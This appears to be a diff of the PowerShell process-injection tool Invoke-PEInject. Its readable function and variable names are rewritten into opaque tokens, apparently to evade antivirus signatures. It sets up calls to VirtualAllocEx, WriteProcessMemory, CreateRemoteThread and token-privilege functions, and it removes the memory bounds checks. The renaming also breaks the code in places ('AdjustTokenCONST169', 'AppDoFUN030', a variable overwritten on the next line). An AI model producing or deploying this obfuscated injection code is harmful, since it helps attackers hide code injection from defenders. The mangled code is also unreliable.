-            $VirtualAllocEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualAllocExAddr, $VirtualAllocExDelegate)
-            $Win32Functions | Add-Member NoteProperty -Name VirtualAllocEx -Value $VirtualAllocEx
+            $VAR0046 = FUN012 kernel32.dll VirtualAllocEx
+            $VAR0047 = FUN011 @([IntPtr], [IntPtr], [UIntPtr], [UInt32], [UInt32]) ([IntPtr])
+            $VAR0048 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VAR0046, $VAR0047)
+            $VAR0042 | Add-Member NoteProperty -Name FUN032 -Value $VAR0048
 
-            $memcpyAddr = Get-ProcAddress msvcrt.dll memcpy
-            $memcpyDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr]) ([IntPtr])
-            $memcpy = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($memcpyAddr, $memcpyDelegate)
-            $Win32Functions | Add-Member -MemberType NoteProperty -Name memcpy -Value $memcpy
+            $VAR0049 = FUN012 msvcrt.dll memcpy
+            $VAR0050 = FUN011 @([IntPtr], [IntPtr], [UIntPtr]) ([IntPtr])
+            $VAR0051 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VAR0049, $VAR0050)
+            $VAR0042 | Add-Member -MemberType NoteProperty -Name FUN033 -Value $VAR0051
 
-            $memsetAddr = Get-ProcAddress msvcrt.dll memset
-            $memsetDelegate = Get-DelegateType @([IntPtr], [Int32], [IntPtr]) ([IntPtr])
-            $memset = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($memsetAddr, $memsetDelegate)
-            $Win32Functions | Add-Member -MemberType NoteProperty -Name memset -Value $memset
+            $VAR0052 = FUN012 msvcrt.dll memset
+            $VAR0053 = FUN011 @([IntPtr], [Int32], [IntPtr]) ([IntPtr])
+            $VAR0054 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VAR0052, $VAR0053)
+            $VAR0042 | Add-Member -MemberType NoteProperty -Name FUN034 -Value $VAR0054
 
-            $LoadLibraryAddr = Get-ProcAddress kernel32.dll LoadLibraryA
-            $LoadLibraryDelegate = Get-DelegateType @([String]) ([IntPtr])
-            $LoadLibrary = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($LoadLibraryAddr, $LoadLibraryDelegate)
-            $Win32Functions | Add-Member -MemberType NoteProperty -Name LoadLibrary -Value $LoadLibrary
+            $VAR0055 = FUN012 kernel32.dll LoadLibraryA
+            $VAR0056 = FUN011 @([String]) ([IntPtr])
+            $VAR0057 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VAR0055, $VAR0056)
+            $VAR0042 | Add-Member -MemberType NoteProperty -Name FUN035 -Value $VAR0057
 
-            $GetProcAddressAddr = Get-ProcAddress kernel32.dll GetProcAddress
-            $GetProcAddressDelegate = Get-DelegateType @([IntPtr], [String]) ([IntPtr])
-            $GetProcAddress = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetProcAddressAddr, $GetProcAddressDelegate)
-            $Win32Functions | Add-Member -MemberType NoteProperty -Name GetProcAddress -Value $GetProcAddress
+            $VAR0058 = FUN012 kernel32.dll GetProcAddress
+            $VAR0059 = FUN011 @([IntPtr], [String]) ([IntPtr])
+            $VAR0060 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VAR0058, $VAR0059)
+            $VAR0042 | Add-Member -MemberType NoteProperty -Name FUN036 -Value $VAR0060
 
-            $GetProcAddressIntPtrAddr = Get-ProcAddress kernel32.dll GetProcAddress 
-            $GetProcAddressIntPtrDelegate = Get-DelegateType @([IntPtr], [IntPtr]) ([IntPtr])
-            $GetProcAddressIntPtr = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetProcAddressIntPtrAddr, $GetProcAddressIntPtrDelegate)
-            $Win32Functions | Add-Member -MemberType NoteProperty -Name GetProcAddressIntPtr -Value $GetProcAddressIntPtr
+            $VAR0061 = FUN012 kernel32.dll GetProcAddress 
+            $VAR0062 = FUN011 @([IntPtr], [IntPtr]) ([IntPtr])
+            $VAR0063 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VAR0061, $VAR0062)
+            $VAR0042 | Add-Member -MemberType NoteProperty -Name FUN037 -Value $VAR0063
 
-            $VirtualFreeAddr = Get-ProcAddress kernel32.dll VirtualFree
-            $VirtualFreeDelegate = Get-DelegateType @([IntPtr], [UIntPtr], [UInt32]) ([Bool])
-            $VirtualFree = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualFreeAddr, $VirtualFreeDelegate)
-            $Win32Functions | Add-Member NoteProperty -Name VirtualFree -Value $VirtualFree
+            $VAR0064 = FUN012 kernel32.dll VirtualFree
+            $VAR0065 = FUN011 @([IntPtr], [UIntPtr], [UInt32]) ([Bool])
+            $VAR0066 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VAR0064, $VAR0065)
+            $VAR0042 | Add-Member NoteProperty -Name FUN038 -Value $VAR0066
 
-            $VirtualFreeExAddr = Get-ProcAddress kernel32.dll VirtualFreeEx
-            $VirtualFreeExDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr], [UInt32]) ([Bool])
-            $VirtualFreeEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualFreeExAddr, $VirtualFreeExDelegate)
-            $Win32Functions | Add-Member NoteProperty -Name VirtualFreeEx -Value $VirtualFreeEx
+            $VAR0067 = FUN012 kernel32.dll VirtualFreeEx
+            $VAR0068 = FUN011 @([IntPtr], [IntPtr], [UIntPtr], [UInt32]) ([Bool])
+            $VAR0069 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VAR0067, $VAR0068)
+            $VAR0042 | Add-Member NoteProperty -Name FUN039 -Value $VAR0069
 
-            $VirtualProtectAddr = Get-ProcAddress kernel32.dll VirtualProtect
-            $VirtualProtectDelegate = Get-DelegateType @([IntPtr], [UIntPtr], [UInt32], [UInt32].MakeByRefType()) ([Bool])
-            $VirtualProtect = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualProtectAddr, $VirtualProtectDelegate)
-            $Win32Functions | Add-Member NoteProperty -Name VirtualProtect -Value $VirtualProtect
+            $VAR0070 = FUN012 kernel32.dll VirtualProtect
+            $VAR0071 = FUN011 @([IntPtr], [UIntPtr], [UInt32], [UInt32].MakeByRefType()) ([Bool])
+            $VAR0072 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VAR0070, $VAR0071)
+            $VAR0042 | Add-Member NoteProperty -Name FUN040 -Value $VAR0072
 
-            $GetModuleHandleAddr = Get-ProcAddress kernel32.dll GetModuleHandleA
-            $GetModuleHandleDelegate = Get-DelegateType @([String]) ([IntPtr])
-            $GetModuleHandle = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetModuleHandleAddr, $GetModuleHandleDelegate)
-            $Win32Functions | Add-Member NoteProperty -Name GetModuleHandle -Value $GetModuleHandle
+            $VAR0073 = FUN012 kernel32.dll GetModuleHandleA
+            $VAR0074 = FUN011 @([String]) ([IntPtr])
+            $VAR0075 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VAR0073, $VAR0074)
+            $VAR0042 | Add-Member NoteProperty -Name FUN041 -Value $VAR0075
 
-            $FreeLibraryAddr = Get-ProcAddress kernel32.dll FreeLibrary
-            $FreeLibraryDelegate = Get-DelegateType @([IntPtr]) ([Bool])
-            $FreeLibrary = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($FreeLibraryAddr, $FreeLibraryDelegate)
-            $Win32Functions | Add-Member -MemberType NoteProperty -Name FreeLibrary -Value $FreeLibrary
+            $VAR0076 = FUN012 kernel32.dll FreeLibrary
+            $VAR0077 = FUN011 @([IntPtr]) ([Bool])
+            $VAR0078 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VAR0076, $VAR0077)
+            $VAR0042 | Add-Member -MemberType NoteProperty -Name FUN042 -Value $VAR0078
 
-            $OpenProcessAddr = Get-ProcAddress kernel32.dll OpenProcess
-            $OpenProcessDelegate = Get-DelegateType @([UInt32], [Bool], [UInt32]) ([IntPtr])
-            $OpenProcess = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenProcessAddr, $OpenProcessDelegate)
-            $Win32Functions | Add-Member -MemberType NoteProperty -Name OpenProcess -Value $OpenProcess
+            $VAR0079 = FUN012 kernel32.dll OpenProcess
+            $VAR0080 = FUN011 @([UInt32], [Bool], [UInt32]) ([IntPtr])
+            $VAR0081 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VAR0079, $VAR0080)
+            $VAR0042 | Add-Member -MemberType NoteProperty -Name FUN043 -Value $VAR0081
 
-            $WaitForSingleObjectAddr = Get-ProcAddress kernel32.dll WaitForSingleObject
-            $WaitForSingleObjectDelegate = Get-DelegateType @([IntPtr], [UInt32]) ([UInt32])
-            $WaitForSingleObject = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WaitForSingleObjectAddr, $WaitForSingleObjectDelegate)
-            $Win32Functions | Add-Member -MemberType NoteProperty -Name WaitForSingleObject -Value $WaitForSingleObject
+            $VAR0082 = FUN012 kernel32.dll WaitForSingleObject
+            $VAR0083 = FUN011 @([IntPtr], [UInt32]) ([UInt32])
+            $VAR0084 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VAR0082, $VAR0083)
+            $VAR0042 | Add-Member -MemberType NoteProperty -Name FUN044 -Value $VAR0084
 
-            $WriteProcessMemoryAddr = Get-ProcAddress kernel32.dll WriteProcessMemory
-            $WriteProcessMemoryDelegate = Get-DelegateType @([IntPtr], [IntPtr], [IntPtr], [UIntPtr], [UIntPtr].MakeByRefType()) ([Bool])
-            $WriteProcessMemory = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WriteProcessMemoryAddr, $WriteProcessMemoryDelegate)
-            $Win32Functions | Add-Member -MemberType NoteProperty -Name WriteProcessMemory -Value $WriteProcessMemory
+            $VAR0085 = FUN012 kernel32.dll WriteProcessMemory
+            $VAR0086 = FUN011 @([IntPtr], [IntPtr], [IntPtr], [UIntPtr], [UIntPtr].MakeByRefType()) ([Bool])
+            $VAR0087 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VAR0085, $VAR0086)
+            $VAR0042 | Add-Member -MemberType NoteProperty -Name FUN045 -Value $VAR0087
 
-            $ReadProcessMemoryAddr = Get-ProcAddress kernel32.dll ReadProcessMemory
-            $ReadProcessMemoryDelegate = Get-DelegateType @([IntPtr], [IntPtr], [IntPtr], [UIntPtr], [UIntPtr].MakeByRefType()) ([Bool])
-            $ReadProcessMemory = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ReadProcessMemoryAddr, $ReadProcessMemoryDelegate)
-            $Win32Functions | Add-Member -MemberType NoteProperty -Name ReadProcessMemory -Value $ReadProcessMemory
+            $VAR0088 = FUN012 kernel32.dll ReadProcessMemory
+            $VAR0089 = FUN011 @([IntPtr], [IntPtr], [IntPtr], [UIntPtr], [UIntPtr].MakeByRefType()) ([Bool])
+            $VAR0090 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VAR0088, $VAR0089)
+            $VAR0042 | Add-Member -MemberType NoteProperty -Name FUN046 -Value $VAR0090
 
-            $CreateRemoteThreadAddr = Get-ProcAddress kernel32.dll CreateRemoteThread
-            $CreateRemoteThreadDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr])
-            $CreateRemoteThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CreateRemoteThreadAddr, $CreateRemoteThreadDelegate)
-            $Win32Functions | Add-Member -MemberType NoteProperty -Name CreateRemoteThread -Value $CreateRemoteThread
+            $VAR0091 = FUN012 kernel32.dll CreateRemoteThread
+            $VAR0092 = FUN011 @([IntPtr], [IntPtr], [UIntPtr], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr])
+            $VAR0093 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VAR0091, $VAR0092)
+            $VAR0042 | Add-Member -MemberType NoteProperty -Name FUN047 -Value $VAR0093
 
-            $GetExitCodeThreadAddr = Get-ProcAddress kernel32.dll GetExitCodeThread
-            $GetExitCodeThreadDelegate = Get-DelegateType @([IntPtr], [Int32].MakeByRefType()) ([Bool])
-            $GetExitCodeThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetExitCodeThreadAddr, $GetExitCodeThreadDelegate)
-            $Win32Functions | Add-Member -MemberType NoteProperty -Name GetExitCodeThread -Value $GetExitCodeThread
+            $VAR0094 = FUN012 kernel32.dll GetExitCodeThread
+            $VAR0095 = FUN011 @([IntPtr], [Int32].MakeByRefType()) ([Bool])
+            $VAR0096 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VAR0094, $VAR0095)
+            $VAR0042 | Add-Member -MemberType NoteProperty -Name FUN048 -Value $VAR0096
 
-            $OpenThreadTokenAddr = Get-ProcAddress Advapi32.dll OpenThreadToken
-            $OpenThreadTokenDelegate = Get-DelegateType @([IntPtr], [UInt32], [Bool], [IntPtr].MakeByRefType()) ([Bool])
-            $OpenThreadToken = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenThreadTokenAddr, $OpenThreadTokenDelegate)
-            $Win32Functions | Add-Member -MemberType NoteProperty -Name OpenThreadToken -Value $OpenThreadToken
+            $VAR0097 = FUN012 Advapi32.dll OpenThreadToken
+            $VAR0098 = FUN011 @([IntPtr], [UInt32], [Bool], [IntPtr].MakeByRefType()) ([Bool])
+            $VAR0099 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VAR0097, $VAR0098)
+            $VAR0042 | Add-Member -MemberType NoteProperty -Name FUN049 -Value $VAR0099
 
-            $GetCurrentThreadAddr = Get-ProcAddress kernel32.dll GetCurrentThread
-            $GetCurrentThreadDelegate = Get-DelegateType @() ([IntPtr])
-            $GetCurrentThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetCurrentThreadAddr, $GetCurrentThreadDelegate)
-            $Win32Functions | Add-Member -MemberType NoteProperty -Name GetCurrentThread -Value $GetCurrentThread
+            $VAR0100 = FUN012 kernel32.dll GetCurrentThread
+            $VAR0101 = FUN011 @() ([IntPtr])
+            $VAR0102 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VAR0100, $VAR0101)
+            $VAR0042 | Add-Member -MemberType NoteProperty -Name FUN050 -Value $VAR0102
 
-            $AdjustTokenPrivilegesAddr = Get-ProcAddress Advapi32.dll AdjustTokenPrivileges
-            $AdjustTokenPrivilegesDelegate = Get-DelegateType @([IntPtr], [Bool], [IntPtr], [UInt32], [IntPtr], [IntPtr]) ([Bool])
-            $AdjustTokenPrivileges = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($AdjustTokenPrivilegesAddr, $AdjustTokenPrivilegesDelegate)
-            $Win32Functions | Add-Member -MemberType NoteProperty -Name AdjustTokenPrivileges -Value $AdjustTokenPrivileges
+            $VAR0103 = FUN012 Advapi32.dll AdjustTokenCONST169
+            $VAR0104 = FUN011 @([IntPtr], [Bool], [IntPtr], [UInt32], [IntPtr], [IntPtr]) ([Bool])
+            $VAR0105 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VAR0103, $VAR0104)
+            $VAR0042 | Add-Member -MemberType NoteProperty -Name FUN051 -Value $VAR0105
 
-            $LookupPrivilegeValueAddr = Get-ProcAddress Advapi32.dll LookupPrivilegeValueA
-            $LookupPrivilegeValueDelegate = Get-DelegateType @([String], [String], [IntPtr]) ([Bool])
-            $LookupPrivilegeValue = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($LookupPrivilegeValueAddr, $LookupPrivilegeValueDelegate)
-            $Win32Functions | Add-Member -MemberType NoteProperty -Name LookupPrivilegeValue -Value $LookupPrivilegeValue
+            $VAR0106 = FUN012 Advapi32.dll LookupPrivilegeValueA
+            $VAR0107 = FUN011 @([String], [String], [IntPtr]) ([Bool])
+            $VAR0108 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VAR0106, $VAR0107)
+            $VAR0042 | Add-Member -MemberType NoteProperty -Name FUN052 -Value $VAR0108
 
-            $ImpersonateSelfAddr = Get-ProcAddress Advapi32.dll ImpersonateSelf
-            $ImpersonateSelfDelegate = Get-DelegateType @([Int32]) ([Bool])
-            $ImpersonateSelf = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ImpersonateSelfAddr, $ImpersonateSelfDelegate)
-            $Win32Functions | Add-Member -MemberType NoteProperty -Name ImpersonateSelf -Value $ImpersonateSelf
+            $VAR0109 = FUN012 Advapi32.dll ImpersonateSelf
+            $VAR0110 = FUN011 @([Int32]) ([Bool])
+            $VAR0111 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VAR0109, $VAR0110)
+            $VAR0042 | Add-Member -MemberType NoteProperty -Name FUN053 -Value $VAR0111
 
             
             if (([Environment]::OSVersion.Version -ge (New-Object 'Version' 6, 0)) -and ([Environment]::OSVersion.Version -lt (New-Object 'Version' 6, 2))) {
-                $NtCreateThreadExAddr = Get-ProcAddress NtDll.dll NtCreateThreadEx
-                $NtCreateThreadExDelegate = Get-DelegateType @([IntPtr].MakeByRefType(), [UInt32], [IntPtr], [IntPtr], [IntPtr], [IntPtr], [Bool], [UInt32], [UInt32], [UInt32], [IntPtr]) ([UInt32])
-                $NtCreateThreadEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($NtCreateThreadExAddr, $NtCreateThreadExDelegate)
-                $Win32Functions | Add-Member -MemberType NoteProperty -Name NtCreateThreadEx -Value $NtCreateThreadEx
+                $VAR0112 = FUN012 NtDll.dll NtCreateThreadEx
+                $VAR0113 = FUN011 @([IntPtr].MakeByRefType(), [UInt32], [IntPtr], [IntPtr], [IntPtr], [IntPtr], [Bool], [UInt32], [UInt32], [UInt32], [IntPtr]) ([UInt32])
+                $VAR0114 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VAR0112, $VAR0113)
+                $VAR0042 | Add-Member -MemberType NoteProperty -Name FUN054 -Value $VAR0114
             }
 
-            $IsWow64ProcessAddr = Get-ProcAddress Kernel32.dll IsWow64Process
-            $IsWow64ProcessDelegate = Get-DelegateType @([IntPtr], [Bool].MakeByRefType()) ([Bool])
-            $IsWow64Process = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($IsWow64ProcessAddr, $IsWow64ProcessDelegate)
-            $Win32Functions | Add-Member -MemberType NoteProperty -Name IsWow64Process -Value $IsWow64Process
+            $VAR0115 = FUN012 Kernel32.dll IsWow64Process
+            $VAR0116 = FUN011 @([IntPtr], [Bool].MakeByRefType()) ([Bool])
+            $VAR0117 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VAR0115, $VAR0116)
+            $VAR0042 | Add-Member -MemberType NoteProperty -Name FUN055 -Value $VAR0117
 
-            $CreateThreadAddr = Get-ProcAddress Kernel32.dll CreateThread
-            $CreateThreadDelegate = Get-DelegateType @([IntPtr], [IntPtr], [IntPtr], [IntPtr], [UInt32], [UInt32].MakeByRefType()) ([IntPtr])
-            $CreateThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CreateThreadAddr, $CreateThreadDelegate)
-            $Win32Functions | Add-Member -MemberType NoteProperty -Name CreateThread -Value $CreateThread
+            $VAR0118 = FUN012 Kernel32.dll CreateThread
+            $VAR0119 = FUN011 @([IntPtr], [IntPtr], [IntPtr], [IntPtr], [UInt32], [UInt32].MakeByRefType()) ([IntPtr])
+            $VAR0120 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VAR0118, $VAR0119)
+            $VAR0042 | Add-Member -MemberType NoteProperty -Name FUN056 -Value $VAR0120
 
-            return $Win32Functions
+            return $VAR0042
         }
         
 
 
-        
-        
-        
-
-        
-        
-        Function Sub-SignedIntAsUnsigned {
+   
+        Function FUN004 {
             Param(
                 [Parameter(Position = 0, Mandatory = $true)]
                 [Int64]
-                $Value1,
+                $VAR0121,
 
                 [Parameter(Position = 1, Mandatory = $true)]
                 [Int64]
-                $Value2
+                $VAR0122
             )
 
-            [Byte[]]$Value1Bytes = [BitConverter]::GetBytes($Value1)
-            [Byte[]]$Value2Bytes = [BitConverter]::GetBytes($Value2)
-            [Byte[]]$FinalBytes = [BitConverter]::GetBytes([UInt64]0)
+            [Byte[]]$VAR0121Bytes = [BitConverter]::GetBytes($VAR0121)
+            [Byte[]]$VAR0122Bytes = [BitConverter]::GetBytes($VAR0122)
+            [Byte[]]$VAR0123 = [BitConverter]::GetBytes([UInt64]0)
 
-            if ($Value1Bytes.Count -eq $Value2Bytes.Count) {
-                $CarryOver = 0
-                for ($i = 0; $i -lt $Value1Bytes.Count; $i++) {
-                    $Val = $Value1Bytes[$i] - $CarryOver
+            if ($VAR0121Bytes.Count -eq $VAR0122Bytes.Count) {
+                $VAR0124 = 0
+                for ($i = 0; $i -lt $VAR0121Bytes.Count; $i++) {
+                    $Val = $VAR0121Bytes[$i] - $VAR0124
                     
-                    if ($Val -lt $Value2Bytes[$i]) {
+                    if ($Val -lt $VAR0122Bytes[$i]) {
                         $Val += 256
-                        $CarryOver = 1
+                        $VAR0124 = 1
                     }
                     else {
-                        $CarryOver = 0
+                        $VAR0124 = 0
                     }
 
-                    [UInt16]$Sum = $Val - $Value2Bytes[$i]
+                    [UInt16]$Sum = $Val - $VAR0122Bytes[$i]
 
-                    $FinalBytes[$i] = $Sum -band 0x00FF
+                    $VAR0123[$i] = $Sum -band 0x00FF
                 }
             }
             else {
-                Throw "Cannot subtract bytearrays of different sizes"
+                Throw "ERROR01"
             }
 
-            return [BitConverter]::ToInt64($FinalBytes, 0)
+            return [BitConverter]::ToInt64($VAR0123, 0)
         }
 
-        Function Add-SignedIntAsUnsigned {
+        Function FUN005 {
             Param(
                 [Parameter(Position = 0, Mandatory = $true)]
                 [Int64]
-                $Value1,
+                $VAR0121,
 
                 [Parameter(Position = 1, Mandatory = $true)]
                 [Int64]
-                $Value2
+                $VAR0122
             )
 
-            [Byte[]]$Value1Bytes = [BitConverter]::GetBytes($Value1)
-            [Byte[]]$Value2Bytes = [BitConverter]::GetBytes($Value2)
-            [Byte[]]$FinalBytes = [BitConverter]::GetBytes([UInt64]0)
+            [Byte[]]$VAR0121Bytes = [BitConverter]::GetBytes($VAR0121)
+            [Byte[]]$VAR0122Bytes = [BitConverter]::GetBytes($VAR0122)
+            [Byte[]]$VAR0123 = [BitConverter]::GetBytes([UInt64]0)
 
-            if ($Value1Bytes.Count -eq $Value2Bytes.Count) {
-                $CarryOver = 0
-                for ($i = 0; $i -lt $Value1Bytes.Count; $i++) {
+            if ($VAR0121Bytes.Count -eq $VAR0122Bytes.Count) {
+                $VAR0124 = 0
+                for ($i = 0; $i -lt $VAR0121Bytes.Count; $i++) {
                     
-                    [UInt16]$Sum = $Value1Bytes[$i] + $Value2Bytes[$i] + $CarryOver
+                    [UInt16]$Sum = $VAR0121Bytes[$i] + $VAR0122Bytes[$i] + $VAR0124
 
-                    $FinalBytes[$i] = $Sum -band 0x00FF
+                    $VAR0123[$i] = $Sum -band 0x00FF
 
                     if (($Sum -band 0xFF00) -eq 0x100) {
-                        $CarryOver = 1
+                        $VAR0124 = 1
                     }
                     else {
-                        $CarryOver = 0
+                        $VAR0124 = 0
                     }
                 }
             }
             else {
-                Throw "Cannot add bytearrays of different sizes"
+                Throw "ERROR02"
             }
 
-            return [BitConverter]::ToInt64($FinalBytes, 0)
+            return [BitConverter]::ToInt64($VAR0123, 0)
         }
 
-        Function Compare-Val1GreaterThanVal2AsUInt {
+        Function FUN006 {
             Param(
                 [Parameter(Position = 0, Mandatory = $true)]
                 [Int64]
-                $Value1,
+                $VAR0121,
 
                 [Parameter(Position = 1, Mandatory = $true)]
                 [Int64]
-                $Value2
+                $VAR0122
             )
 
-            [Byte[]]$Value1Bytes = [BitConverter]::GetBytes($Value1)
-            [Byte[]]$Value2Bytes = [BitConverter]::GetBytes($Value2)
+            [Byte[]]$VAR0121Bytes = [BitConverter]::GetBytes($VAR0121)
+            [Byte[]]$VAR0122Bytes = [BitConverter]::GetBytes($VAR0122)
 
-            if ($Value1Bytes.Count -eq $Value2Bytes.Count) {
-                for ($i = $Value1Bytes.Count - 1; $i -ge 0; $i--) {
-                    if ($Value1Bytes[$i] -gt $Value2Bytes[$i]) {
+            if ($VAR0121Bytes.Count -eq $VAR0122Bytes.Count) {
+                for ($i = $VAR0121Bytes.Count - 1; $i -ge 0; $i--) {
+                    if ($VAR0121Bytes[$i] -gt $VAR0122Bytes[$i]) {
                         return $true
                     }
-                    elseif ($Value1Bytes[$i] -lt $Value2Bytes[$i]) {
+                    elseif ($VAR0121Bytes[$i] -lt $VAR0122Bytes[$i]) {
                         return $false
                     }
                 }
             }
             else {
-                Throw "Cannot compare byte arrays of different size"
+                Throw "ERROR03"
             }
 
             return $false
         }
 
 
-        Function Convert-UIntToInt {
+        Function FUN007 {
             Param(
                 [Parameter(Position = 0, Mandatory = $true)]
                 [UInt64]
-                $Value
+                $VAR0123
             )
 
-            [Byte[]]$ValueBytes = [BitConverter]::GetBytes($Value)
-            return ([BitConverter]::ToInt64($ValueBytes, 0))
+            [Byte[]]$VAR0123Bytes = [BitConverter]::GetBytes($VAR0123)
+            return ([BitConverter]::ToInt64($VAR0123Bytes, 0))
         }
 
 
-        Function Get-Hex {
+        Function FUN008 {
             Param(
                 [Parameter(Position = 0, Mandatory = $true)]
-                $Value 
+                $VAR0123 
             )
 
-            $ValueSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Value.GetType()) * 2
-            $Hex = "0x{0:X$($ValueSize)}" -f [Int64]$Value 
+            $VAR0123Size = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$VAR0123.GetType()) * 2
+            $VAR0124 = "0x{0:X$($VAR0123Size)}" -f [Int64]$VAR0123 
 
-            return $Hex
+            return $VAR0124
         }
 
-        Function Test-MemoryRangeValid {
+        Function FUN009 {
             Param(
                 [Parameter(Position = 0, Mandatory = $true)]
                 [String]
-                $DebugString,
+                $VAR0125,
 
                 [Parameter(Position = 1, Mandatory = $true)]
                 [System.Object]
-                $PEInfo,
+                $VAR0126,
 
                 [Parameter(Position = 2, Mandatory = $true)]
                 [IntPtr]
-                $StartAddress,
+                $VAR0127,
 
                 [Parameter(ParameterSetName = "Size", Position = 3, Mandatory = $true)]
                 [IntPtr]
                 $Size
             )
 
-            [IntPtr]$FinalEndAddress = [IntPtr](Add-SignedIntAsUnsigned ($StartAddress) ($Size))
+            [IntPtr]$VAR0128 = [IntPtr](FUN005 ($VAR0127) ($Size))
 
-            $PEEndAddress = $PEInfo.EndAddress
+            $VAR0128 = $VAR0126.CONST038
 
-            if ((Compare-Val1GreaterThanVal2AsUInt ($PEInfo.PEHandle) ($StartAddress)) -eq $true) {
-                Throw "Trying to write to memory smaller than allocated address range. $DebugString"
-            }
-            if ((Compare-Val1GreaterThanVal2AsUInt ($FinalEndAddress) ($PEEndAddress)) -eq $true) {
-                Throw "Trying to write to memory greater than allocated address range. $DebugString"
-            }
+            
         }
 
-        Function Write-BytesToMemory {
+        Function FUN010 {
             Param(
                 [Parameter(Position = 0, Mandatory = $true)]
                 [Byte[]]
@@ -759,16 +743,16 @@ function Invoke-PEInject {
 
                 [Parameter(Position = 1, Mandatory = $true)]
                 [IntPtr]
-                $MemoryAddress
+                $VAR0129
             )
 
-            for ($Offset = 0; $Offset -lt $Bytes.Length; $Offset++) {
-                [System.Runtime.InteropServices.Marshal]::WriteByte($MemoryAddress, $Offset, $Bytes[$Offset])
+            for ($VAR0130 = 0; $VAR0130 -lt $Bytes.Length; $VAR0130++) {
+                [System.Runtime.InteropServices.Marshal]::WriteByte($VAR0129, $VAR0130, $Bytes[$VAR0130])
             }
         }
 
         
-        Function Get-DelegateType {
+        Function FUN011 {
             Param
             (
                 [OutputType([Type])]
@@ -782,22 +766,22 @@ function Invoke-PEInject {
                 $ReturnType = [Void]
             )
 
-            $Domain = [AppDomain]::CurrentDomain
-            $DynAssembly = New-Object System.Reflection.AssemblyName('ReflectedDelegate')
-            $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
-            $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('InMemoryModule', $false)
-            $TypeBuilder = $ModuleBuilder.DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
-            $ConstructorBuilder = $TypeBuilder.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $Parameters)
-            $ConstructorBuilder.SetImplementationFlags('Runtime, Managed')
-            $MethodBuilder = $TypeBuilder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $ReturnType, $Parameters)
-            $MethodBuilder.SetImplementationFlags('Runtime, Managed')
+            $DoFUN030 = [AppDoFUN030]::CurrentDoFUN030
+            $VAR0131 = New-Object System.Reflection.AssemblyName('ReflectedDelegate')
+            $VAR013 = $DoFUN030.DefineDynamicAssembly($VAR0131, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
+            $VAR014 = $VAR013.DefineDynamicModule('InMemoryModule', $false)
